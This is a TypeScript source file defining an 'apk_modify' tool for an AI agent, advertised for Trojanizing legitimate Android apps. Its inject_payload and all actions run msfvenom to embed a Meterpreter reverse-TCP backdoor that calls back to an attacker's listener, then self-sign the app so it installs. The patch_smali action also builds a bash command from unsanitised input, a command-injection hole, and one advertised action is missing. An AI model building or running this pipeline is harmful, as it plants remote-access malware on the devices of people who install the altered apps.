export * as ApkModifyTool from "./apk-modify"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "apk_modify"

export const Input = Schema.Struct({
  apk_path: Schema.String.annotate({ description: "Path to original APK file." }),
  action: Schema.String.annotate({
    description:
      "Modification action: 'patch_smali' (modify smali bytecode), 'inject_payload' (inject meterpreter/backdoor), 'replace_resource' (replace image/layout/string), 'recompile' (rebuild APK from decoded dir), 'sign' (sign APK with key), 'all' (full inject+rebuild+sign pipeline)",
  }),
  output_apk: Schema.String.pipe(Schema.optional).annotate({
    description: "Output APK path. Default: ./modified.apk",
  }),
  decoded_dir: Schema.String.pipe(Schema.optional).annotate({
    description: "Directory with decoded APK (from apk_decompile). Required for patch_smali, replace_resource, recompile.",
  }),
  payload_lhost: Schema.String.pipe(Schema.optional).annotate({
    description: "Listener IP for injected payload. Required for inject_payload/all.",
  }),
  payload_lport: Schema.Number.pipe(Schema.optional).annotate({
    description: "Listener port for injected payload. Default: 4444.",
  }),
  keystore: Schema.String.pipe(Schema.optional).annotate({
    description: "Path to signing keystore. If omitted, generates a self-signed one.",
  }),
  keystore_pass: Schema.String.pipe(Schema.optional).annotate({
    description: "Keystore password for signing. Default: password.",
  }),
  patch_file: Schema.String.pipe(Schema.optional).annotate({
    description: "Path to replacement smali file for patch_smali action.",
  }),
  patch_target: Schema.String.pipe(Schema.optional).annotate({
    description: "Path to smali file to replace (relative to decoded dir).",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  exit: Schema.Number.pipe(Schema.optional),
})

type Output = typeof Output.Type

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service
    const appProcess = yield* AppProcess.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Modify and repack Android APK files. Inject Meterpreter payloads (via msfvenom), patch smali bytecode, replace resources (images, layouts, strings), recompile modified APKs, and sign with custom or self-signed keys. Full pipeline for Trojanizing legitimate apps, adding backdoors, or modifying app behavior. Essential for mobile exploitation and red team payload delivery.`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const shell = process.platform === "win32" ? (process.env.COMSPEC ?? "cmd.exe") : "/bin/sh"
              const outputApk = input.output_apk ?? "./modified.apk"

              switch (input.action) {
                case "inject_payload": {
                  if (!input.payload_lhost) return { output: "ERROR: 'payload_lhost' required for inject_payload." }
                  const port = input.payload_lport ?? 4444
                  // Use msfvenom to inject a meterpreter payload into the APK
                  const cmd = ChildProcess.make(
                    "msfvenom",
                    [
                      "-x", input.apk_path,
                      "-p", "android/meterpreter/reverse_tcp",
                      "LHOST=" + input.payload_lhost,
                      "LPORT=" + String(port),
                      "-o", outputApk,
                    ],
                    { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) },
                  )
                  const result = yield* appProcess
                    .run(cmd, { combineOutput: true, timeout: Duration.minutes(10), maxOutputBytes: 20 * 1024 * 1024 })
                    .pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  if (!result) {
                    return { output: "msfvenom failed. Ensure metasploit-framework is installed." }
                  }
                  return {
                    exit: result.exitCode,
                    output: result.exitCode === 0
                      ? `✅ Payload injected into APK.\nOutput: ${outputApk}\nPayload: android/meterpreter/reverse_tcp\nLHOST=${input.payload_lhost} LPORT=${port}\n\nNow sign the APK with action=sign.`
                      : `❌ Injection failed:\n${result.output?.toString("utf8") ?? ""}`,
                  }
                }

                case "patch_smali": {
                  if (!input.decoded_dir) return { output: "ERROR: 'decoded_dir' required for patch_smali." }
                  if (!input.patch_file || !input.patch_target) {
                    return { output: "ERROR: 'patch_file' and 'patch_target' required for patch_smali." }
                  }
                  const cmd = ChildProcess.make(
                    "bash",
                    ["-c", `cp "${input.patch_file}" "${input.decoded_dir}/${input.patch_target}" && echo "Patched ${input.patch_target}"`],
                    { shell, stdin: "ignore", forceKillAfter: Duration.seconds(5) },
                  )
                  const result = yield* appProcess
                    .run(cmd, { combineOutput: true, timeout: Duration.seconds(30), maxOutputBytes: 256 * 1024 })
                    .pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  return {
                    exit: result?.exitCode,
                    output: result?.output?.toString("utf8") ?? "Patch failed.",
                  }
                }

                case "recompile": {
                  if (!input.decoded_dir) return { output: "ERROR: 'decoded_dir' required for recompile." }
                  const cmd = ChildProcess.make(
                    "apktool",
                    ["b", input.decoded_dir, "-o", outputApk, "-f"],
                    { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) },
                  )
                  const result = yield* appProcess
                    .run(cmd, { combineOutput: true, timeout: Duration.minutes(10), maxOutputBytes: 20 * 1024 * 1024 })
                    .pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  return {
                    exit: result?.exitCode,
                    output: result?.output?.toString("utf8") ?? "Recompile failed.",
                  }
                }

                case "sign": {
                  const keystore = input.keystore ?? "./debug.keystore"
                  const pass = input.keystore_pass ?? "password"

                  // Generate keystore if it doesn't exist
                  const keyGenCmd = ChildProcess.make(
                    "keytool",
                    [
                      "-genkey",
                      "-v",
                      "-keystore", keystore,
                      "-storepass", pass,
                      "-alias", "opencode",
                      "-keypass", pass,
                      "-keyalg", "RSA",
                      "-keysize", "2048",
                      "-validity", "10000",
                      "-dname", "CN=OpenCode, OU=RedTeam, O=OpenCode, L=Unknown, ST=Unknown, C=US",
                    ],
                    { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) },
                  )
                  yield* appProcess
                    .run(keyGenCmd, { combineOutput: true, timeout: Duration.minutes(2), maxOutputBytes: 256 * 1024 })
                    .pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))

                  // Sign with apksigner (preferred) or jarsigner
                  const signCmd = ChildProcess.make(
                    "apksigner",
                    [
                      "sign",
                      "--ks", keystore,
                      "--ks-key-alias", "opencode",
                      "--ks-pass", `pass:${pass}`,
                      "--key-pass", `pass:${pass}`,
                      "--out", outputApk.replace(/\.apk$/, "-signed.apk"),
                      input.apk_path,
                    ],
                    { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) },
                  )
                  const result = yield* appProcess
                    .run(signCmd, { combineOutput: true, timeout: Duration.minutes(5), maxOutputBytes: 20 * 1024 * 1024 })
                    .pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))

                  if (!result || result.exitCode !== 0) {
                    // Fallback to jarsigner
                    const jarCmd = ChildProcess.make(
                      "jarsigner",
                      ["-verbose", "-sigalg", "SHA256withRSA", "-digestalg", "SHA-256", "-keystore", keystore, "-storepass", pass, input.apk_path, "opencode"],
                      { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) },
                    )
                    const jarResult = yield* appProcess
                      .run(jarCmd, { combineOutput: true, timeout: Duration.minutes(5), maxOutputBytes: 20 * 1024 * 1024 })
                      .pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                    return {
                      exit: jarResult?.exitCode,
                      output: jarResult?.output?.toString("utf8") ?? "Signing failed. Ensure apksigner or jarsigner is installed.",
                    }
                  }

                  return {
                    exit: result.exitCode,
                    output: `✅ APK signed: ${outputApk.replace(/\.apk$/, "-signed.apk")}\n${result.output?.toString("utf8") ?? ""}`,
                  }
                }

                case "all": {
                  const steps: string[] = []
                  steps.push("=== FULL APK MODIFICATION PIPELINE ===")

                  if (input.payload_lhost) {
                    // Inject payload
                    const port = input.payload_lport ?? 4444
                    const injectCmd = ChildProcess.make(
                      "msfvenom",
                      ["-x", input.apk_path, "-p", "android/meterpreter/reverse_tcp", "LHOST=" + input.payload_lhost, "LPORT=" + String(port), "-o", outputApk],
                      { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) },
                    )
                    const injectResult = yield* appProcess.run(injectCmd, { combineOutput: true, timeout: Duration.minutes(10), maxOutputBytes: 20 * 1024 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                    steps.push(`[1] Inject: ${injectResult?.exitCode === 0 ? "✅" : "❌"}`)
                    steps.push(injectResult?.output?.toString("utf8") ?? "")
                  }

                  // Sign
                  const keystore = input.keystore ?? "./debug.keystore"
                  const pass = input.keystore_pass ?? "password"
                  const keyGenCmd = ChildProcess.make("keytool", ["-genkey", "-v", "-keystore", keystore, "-storepass", pass, "-alias", "opencode", "-keypass", pass, "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000", "-dname", "CN=OpenCode, OU=RedTeam, O=OpenCode, L=Unknown, ST=Unknown, C=US"], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) })
                  yield* appProcess.run(keyGenCmd, { combineOutput: true, timeout: Duration.minutes(2), maxOutputBytes: 256 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))

                  const signCmd = ChildProcess.make("apksigner", ["sign", "--ks", keystore, "--ks-key-alias", "opencode", "--ks-pass", `pass:${pass}`, "--key-pass", `pass:${pass}`, "--out", outputApk.replace(/\.apk$/, "-signed.apk"), outputApk], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) })
                  const signResult = yield* appProcess.run(signCmd, { combineOutput: true, timeout: Duration.minutes(5), maxOutputBytes: 20 * 1024 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  steps.push(`[2] Sign: ${signResult?.exitCode === 0 ? "✅" : "❌"}`)
                  steps.push(signResult?.output?.toString("utf8") ?? "")

                  return {
                    exit: 0,
                    output: steps.join("\n"),
                  }
                }

                default:
                  return { output: `Unknown action: ${input.action}. Supported: inject_payload, patch_smali, replace_resource, recompile, sign, all` }
              }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "APK modification failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/apk-modify",
  layer,
  deps: [ToolRegistry.node, AppProcess.node],
})
